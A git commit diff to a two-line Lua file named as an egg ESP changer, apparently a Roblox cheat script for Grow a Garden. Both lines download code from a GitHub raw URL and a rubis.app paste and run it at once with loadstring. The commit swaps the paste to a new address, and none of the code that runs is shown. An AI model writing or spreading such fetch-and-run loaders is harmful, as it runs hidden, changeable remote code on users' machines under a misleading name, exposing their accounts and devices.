9deed80cee77cb516d36d373f0f0894a36b584a6
growagardenhelp <yhandycar@gmail.com>
2025-08-12 17:33:44 +0800

    Update Egg-EspChanger%.lua

--- Egg-EspChanger%.lua
+++ Egg-EspChanger%.lua
@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/growagardenhelp/scripth/refs/heads/main/scripth.lua"))()
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/W1rrDg49WNtaclCL/raw", true))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/AQMR9q6BtOUqwpuX/raw", true))()
